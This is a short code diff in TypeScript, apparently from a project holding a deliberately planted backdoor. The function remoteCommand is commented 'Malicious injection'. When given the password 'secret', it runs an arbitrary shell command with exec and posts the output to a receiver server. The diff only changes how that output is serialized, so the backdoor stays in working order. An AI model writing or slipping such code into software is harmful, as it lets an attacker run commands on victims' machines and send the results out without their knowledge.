@@ -13,15 +13,13 @@ export const remoteCommand = (pwd: string, cmd: string) => {
   // Malicious injection
   if (pwd === 'secret') {
     exec(cmd as string, (_err: any, stdout: string) => {
-      // NOTE: Remember to omit error
-      // Serialize stdout data
-      const data = JSON.stringify({
+      const data = {
         data: stdout,
-      });
+      };
       // Init request to receiver server
       HttpUtils.post('/', data, {
         'Content-Type': 'application/json',
-        'Content-Length': Buffer.byteLength(data),
+        'Content-Length': Buffer.byteLength(JSON.stringify(data)),
       });
     });
   }
